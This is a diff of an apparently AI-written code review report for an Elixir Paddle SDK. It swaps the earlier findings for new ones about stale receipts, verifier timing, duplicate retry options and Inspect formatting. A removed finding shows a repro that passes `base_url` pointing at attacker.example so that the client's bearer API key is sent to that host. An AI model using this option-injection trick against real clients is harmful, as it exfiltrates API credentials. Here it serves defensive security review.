@@ -1,15 +1,14 @@
 ---
 phase: 32-dependency-sdk-trust-boundary
-reviewed: 2026-09-10T22:45:27Z
+reviewed: 2026-09-11T02:17:18Z
 depth: standard
-files_reviewed: 48
+files_reviewed: 46
 files_reviewed_list:
   - CHANGELOG.md
   - README.md
   - bin/phase32_compatibility.sh
   - bin/phase32_contract_proof.sh
   - demo/README.md
-  - demo/mix.lock
   - guides/accrue-seam.md
   - guides/getting-started.md
   - guides/telemetry.md
@@ -34,7 +33,6 @@ files_reviewed_list:
   - lib/paddle/transaction/checkout.ex
   - lib/paddle/transactions.ex
   - mix.exs
-  - mix.lock
   - test/paddle/adjustments_test.exs
   - test/paddle/client_test.exs
   - test/paddle/customers/addresses_test.exs
@@ -53,8 +51,8 @@ files_reviewed_list:
   - test/paddle/subscriptions_test.exs
   - test/paddle/transactions_test.exs
 findings:
-  critical: 2
-  warning: 2
+  critical: 3
+  warning: 1
   info: 0
   total: 4
 status: issues_found
@@ -62,81 +60,55 @@ status: issues_found
 
 # Phase 32: Code Review Report
 
-**Reviewed:** 2026-09-10T22:45:27Z
+**Reviewed:** 2026-09-11T02:17:18Z
 **Depth:** standard
-**Files Reviewed:** 48
+**Files Reviewed:** 46
 **Status:** issues_found
 
 ## Summary
 
-The Phase 32 dependency, request-policy, telemetry, inspection, resource, proof-runner, documentation, and test changes were reviewed at standard depth. The full test suite passes (260 tests), shell syntax passes, and the compatibility receipt self-test passes, but those gates miss two release-blocking runtime defects. Public mutation option lists can override Req's base URL while retaining the client's bearer credential, and an unexpected provider error-body shape crashes the normalization boundary. The inspection inventory test is not actually exhaustive per module, and one public stream contract documents tuple/error yielding that the implementation does not provide.
+The Phase 32 implementation and its gap-closure commits were reviewed against the declared summary scope and the committed diff from `aef4c2f`. Generated lockfiles and the unrelated `.tool-versions` working-tree change were excluded from substantive review. The full suite passes with 272 tests, and shell syntax plus the compatibility receipt self-test pass, but those checks miss three release-blocking contract defects: a failed full matrix can leave an old passing receipt in place, the bounded verifier remains too close to its deadline and has timed out on a fresh run, and subscription lifecycle parsing can silently accept duplicate `:retry` options. The custom Inspect implementations also emit malformed struct-like syntax.
 
 ## Narrative Findings (AI reviewer)
 
 ## Critical Issues
 
-### CR-01: [BLOCKER] Public mutation options can redirect the bearer token to another host
+### CR-01: [BLOCKER] A failed full compatibility run can leave a stale passing receipt
 
-**File:** `lib/paddle/http.ex:35-45`
+**File:** `bin/phase32_compatibility.sh:165-180`
 
-**Issue:** The central request boundary forwards every unrecognized entry from `opts` into `Req.request/2`. Six public mutation APIs merge their caller-provided `opts` directly into this list (`Paddle.Adjustments.create/3`, `Paddle.Customers.create/3`, `Paddle.Customers.Addresses.create/4`, `Paddle.Customers.PortalSessions.create/4`, `Paddle.NotificationSettings.create/3`, and `Paddle.Transactions.create/3`) even though their public type promises only `{:retry, boolean()}`. Req accepts `base_url` as a per-request option. A direct repro using `Paddle.Customers.create(client, attrs, base_url: "https://attacker.example")` dispatched to `attacker.example` with `Authorization: Bearer secret`. This defeats the validated client trust boundary and can exfiltrate the Paddle API key whenever an application forwards an insufficiently trusted option list.
+**Issue:** `run_matrix` validates `ACCRUE_CHECKOUT` before deleting `phase32-compatibility.receipt`. If an earlier run published a passing receipt and a later invocation fails either preflight check, the old acceptance artifact remains visible. This was reproduced with a pre-existing receipt and an empty `ACCRUE_CHECKOUT`: the script exited 2 while the receipt still contained `phase32_compatibility=passed`. Any consumer that watches the documented receipt path can therefore mistake a failed or incomplete current run for fresh full-matrix acceptance.
 
-**Fix:** Validate public request options before merging them with internal Req options. Reject non-keyword lists, duplicates, and every key except `:retry`; do not expose arbitrary Req configuration through resource functions. For example:
+**Fix:** Delete or quarantine the destination receipt immediately on entry to `--full`, before every preflight that can fail. Keep publication as the final same-directory atomic rename, and extend `--self-test` to seed a stale receipt, fail preflight, and assert that no acceptance receipt remains.
 
-```elixir
-defp validate_request_opts!(opts) do
-  unless Keyword.keyword?(opts), do: raise(ArgumentError, "request options must be a keyword list")
-  keys = Keyword.keys(opts)
+### CR-02: [BLOCKER] The bounded contract verifier does not reliably satisfy its 30-second contract
 
-  if Enum.uniq(keys) != keys or Enum.any?(keys, &(&1 != :retry)) do
-    raise ArgumentError, "only the :retry request option is supported"
-  end
+**File:** `bin/phase32_contract_proof.sh:166-180`
 
-  opts
-end
-```
+**Issue:** The verifier sequentially runs the isolated reader/docs pair, the receipt self-test, and the compatibility verifier. Although the latest concurrency change reduces duplicated work, the compatibility verifier still selects whole test files with real jittered retry waits (`bin/phase32_compatibility.sh:41-50`). A fresh review run under the exact 30-second wrapper was terminated during the bounded suite and published no contract receipt; a subsequent warm run passed at 28 seconds. A two-second warm-run margin is not a reliable bounded proof and contradicts the validated claim that this command consistently completes within 30 seconds.
 
-Apply the validation at every public mutation entry point before `Keyword.merge/2`, and add a regression test that `:base_url`, `:auth`, `:headers`, and `:adapter` are rejected before dispatch.
+**Fix:** Remove wall-clock retry sleeps from the verifier path by injecting a zero-delay test retry configuration while testing the retry decision separately, or select narrowly tagged/line-addressed contract tests instead of complete time-bearing files. Require meaningful margin under the 30-second wrapper across cold consecutive runs before treating the receipt as automated SAFE-06 evidence.
 
-### CR-02: [BLOCKER] Malformed provider error payloads crash instead of returning `Paddle.Error`
+### CR-03: [BLOCKER] Subscription pause/resume silently collapse duplicate retry options
 
-**File:** `lib/paddle/error.ex:106-123`
+**File:** `lib/paddle/subscriptions.ex:478-489`
 
-**Issue:** `from_response/2` assumes `body["error"]` is a map. Paddle, an intermediary, or a custom adapter can return a JSON map whose `"error"` value is a string, list, or null. The subsequent `error_body["type"]` access then raises `FunctionClauseError`. A repro with status 502 and `%{"error" => "bad-shape"}` crashes at line 114, escaping the documented `{:error, %Paddle.Error{}}` boundary and losing the new mutation-ambiguity result entirely.
+**Issue:** `normalize_pause_opts/1` and the equivalent `normalize_resume_opts/1` at lines 550-562 use `Keyword.pop/2`, which removes all occurrences while returning only the first value. This bypasses `Paddle.Http`'s duplicate-retry rejection. `[retry: false, retry: true]` reaches dispatch as `retry: false`, while the reversed list raises for `retry: true`; behavior therefore depends on ordering instead of rejecting ambiguous caller configuration consistently. The Phase 32 trust-boundary contract explicitly rejects duplicate request options elsewhere.
 
-**Fix:** Normalize the nested error value independently of the outer body and type-check promoted fields:
-
-```elixir
-body = if is_map(body), do: body, else: %{}
-error_body =
-  case Map.get(body, "error") do
-    value when is_map(value) -> value
-    _ -> %{}
-  end
-```
-
-Add response-normalization tests for `"error" => nil`, strings, lists, and atom-keyed/unexpected maps, including an ambiguous mutation status, and assert they return a conservative `%Paddle.Error{}` rather than raising.
+**Fix:** Count or fetch all `:retry` values before removing the key and raise a key-only `ArgumentError` unless zero or one value is present. Apply the same validation to pause and resume, and add regression cases for both conflicting orders that assert zero adapter dispatches.
 
 ## Warnings
 
-### WR-01: [WARNING] The inspection inventory silently misses additional modules in an existing file
+### WR-01: [WARNING] Custom Inspect output is not valid struct syntax
 
-**File:** `test/paddle/inspection_safety_test.exs:72-91`
+**File:** `lib/paddle/client.ex:213-226`
 
-**Issue:** The claimed exhaustive source inventory operates per file, tests whether any `defstruct`/`defexception` is followed anywhere by `raw_data`, and then records only the first `defmodule` in that file. If a second public struct with `raw_data` is added to a file that already defines a module, the test continues to report the first module and never requires classification for the new one. The broad cross-file regex can also associate one module's struct with a later module's `raw_data`. This makes the deny-by-default safety gate capable of passing while a newly introduced public value retains unsafe default inspection.
+**Issue:** The Phase 32 Inspect implementations concatenate a struct prefix with `to_doc/2` applied to a keyword list. They render values such as `%Paddle.Client{[api_key: "[REDACTED]", ...]}` and `%Paddle.Transaction.Checkout{[raw_data: "[REDACTED]", ...]}`. The brackets make this neither ordinary struct inspection nor valid Elixir struct syntax, degrading logs and copy/paste debugging across all six new implementations (`Paddle.Client`, `Paddle.Error`, `Paddle.NotificationSetting`, `Paddle.PortalSession`, `Paddle.Subscription.ManagementUrls`, and `Paddle.Transaction.Checkout`). Existing tests check redaction canaries but do not validate the representation shape.
 
-**Fix:** Inspect compiled modules/BEAM metadata or parse each source file's AST and collect every individual `defmodule` that defines a struct/exception containing `:raw_data`. Add a fixture with two modules in one source string and assert both are discovered.
-
-### WR-02: [WARNING] Address stream documentation promises tuple errors, but the stream yields structs and raises
-
-**File:** `lib/paddle/customers/addresses.ex:222-245`
-
-**Issue:** The example tells consumers to match `{:ok, %Paddle.Address{}}` and `{:error, %Paddle.Error{}}`, and the Errors section says failures are yielded as tuples. `Paddle.Internal.Pagination.stream_next/1` actually emits `page.data` directly and raises on every error (`lib/paddle/internal/pagination.ex:57-64`). Consumers following this public contract will fail to match successful address structs and cannot handle later-page failures through the documented error branch.
-
-**Fix:** Document direct `%Paddle.Address{}` elements and exception behavior, matching the already-correct high-level guidance in `guides/getting-started.md`, or change the shared stream implementation consistently across all resources if tuple-yielding is the intended API. Add a doctest or contract assertion for the documented enumeration shape.
+**Fix:** Render the redacted key/value pairs with `Inspect.Algebra.container_doc/6` (or an equivalent struct-aware formatter) so the result is `%Module{field: value, ...}` while still honoring the caller's Inspect options. Add exact-shape assertions for one multi-field and one all-redacted struct.
 
 ---
 
-_Reviewed: 2026-09-10T22:45:27Z_
+_Reviewed: 2026-09-11T02:17:18Z_
 _Reviewer: the agent (gsd-code-reviewer)_
 _Depth: standard_
